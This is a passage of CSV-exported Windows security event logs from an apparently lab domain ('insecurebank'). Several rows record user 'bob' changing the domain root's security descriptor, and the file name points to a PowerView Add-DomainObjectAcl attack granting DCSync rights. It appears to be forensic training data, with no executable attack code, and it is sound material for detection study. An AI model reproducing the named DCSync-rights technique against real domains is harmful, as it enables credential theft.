success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""30f197fc-beca-48d6-923e-a52a437119d3""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
21,198242598,2019-03-25 21:28:45.0256272,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,1,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""77b63738-c25c-4fbd-ba96-a7abe17a22a3""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
22,198242599,2019-03-25 21:28:45.0256272,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,1,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""77b63738-c25c-4fbd-ba96-a7abe17a22a3""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14674""}]}}"
23,198242600,2019-03-25 21:28:45.0256272,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,1,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""8e6be6cd-81e7-4c8c-8eb0-50ca85b4950c""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-738609754-2819869699-4189121830-522)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-498)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1107)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-738609754-2819869699-4189121830-1121)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;;RP;c7407360-20bf-11d0-a768-00aa006e0529;;RU)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;RU)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;RP;b8119fd0-04f6-4762-ab7a-4986c76b3f9a;;AU)(OA;OICI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-738609754-2819869699-4189121830-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)""},{""@Name"":""OperationType"",""#text"":""%%14675""}]}}"
24,198242601,2019-03-25 21:28:45.0256272,5136,LogAlways,Microsoft-Windows-Security-Auditing,Security,444,2868,DC1.insecurebank.local,1,,A directory service object was modified,insecurebank\bob,,DSName: insecurebank.local,"ObjectDN: DC=insecurebank,DC=local",ObjectClass: domainDNS,AttributeLDAPDisplayName: nTSecurityDescriptor,,,,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DACL_DCSync_Right_Powerview__Add-DomainObjectAcl.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""OpCorrelationID"",""#text"":""8e6be6cd-81e7-4c8c-8eb0-50ca85b4950c""},{""@Name"":""AppCorrelationID"",""#text"":""-""},{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-21-738609754-2819869699-4189121830-1108""},{""@Name"":""SubjectUserName"",""#text"":""bob""},{""@Name"":""SubjectDomainName"",""#text"":""insecurebank""},{""@Name"":""SubjectLogonId"",""#text"":""0x40F2719""},{""@Name"":""DSName"",""#text"":""insecurebank.local""},{""@Name"":""DSType"",""#text"":""%%14676""},{""@Name"":""ObjectDN"",""#text"":""DC=insecurebank,DC=local""},{""@Name"":""ObjectGUID"",""#text"":""c6faf700-bfe4-452a-a766-424f84c29583""},{""@Name"":""ObjectClass"",""#text"":""domainDNS""},{""@Name"":""AttributeLDAPDisplayName"",""#text"":""nTSecurityDescriptor""},{""@Name"":""AttributeSyntaxOID"",""#text"":""2.5.5.15""},{""@Name"":""AttributeValue"",""#text"":""O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc